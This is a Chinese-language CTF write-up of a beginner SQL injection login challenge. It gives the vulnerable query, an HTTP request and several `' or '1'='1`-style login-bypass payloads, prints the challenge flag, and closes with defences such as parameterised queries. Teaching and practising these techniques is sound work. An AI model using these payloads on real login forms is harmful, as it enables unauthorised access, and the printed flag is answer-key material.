# CTF Writeup: My First SQLi

## 题目信息
- **URL**: http://49.232.142.230:13179/
- **漏洞类型**: SQL注入
- **难度**: 简单

## 题目描述
一个简单的登录页面，显示了完整的SQL查询语句格式：
```sql
SELECT * FROM USERS WHERE username = [用户输入] AND password = [密码输入]
```

## 解题步骤

### 1. 信息收集
访问目标URL，发现页面显示了一个登录表单，并明确显示了SQL查询语句结构，提示存在SQL注入漏洞。

### 2. 漏洞分析
页面显示的查询语句表明用户输入直接拼接到SQL查询中，没有进行任何过滤或参数化查询：
```html
SELECT * FROM USERS WHERE username = [用户输入] AND password = [密码输入]
```

### 3. 漏洞利用
使用简单的SQL注入payload绕过登录验证：

#### 关键Payload:
```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=anything
```

其他成功payload：
- `username=admin' or '1'='1&password=anything`
- `username=' or '1'='1&password=' or '1'='1`
- `username=' or 1=1--&password=anything`

### 4. 原理说明
- `--` 是SQL注释符，可以注释掉查询语句的剩余部分
- 使用 `admin'--` 使查询变为：
  ```sql
  SELECT * FROM USERS WHERE username = 'admin'--' AND password = 'anything'
  ```
- 这样只验证username字段，绕过了密码检查

### 5. 获取Flag
注入成功后页面直接返回Flag，无需进一步的数据提取。

## Flag
**shellmates{SQLi_goeS_BrrRrRR}**

## 防御建议
1. 使用参数化查询（预编译语句）
2. 对用户输入进行严格的验证和过滤
3. 避免在错误信息中泄露数据库结构
4. 使用最小权限原则访问数据库
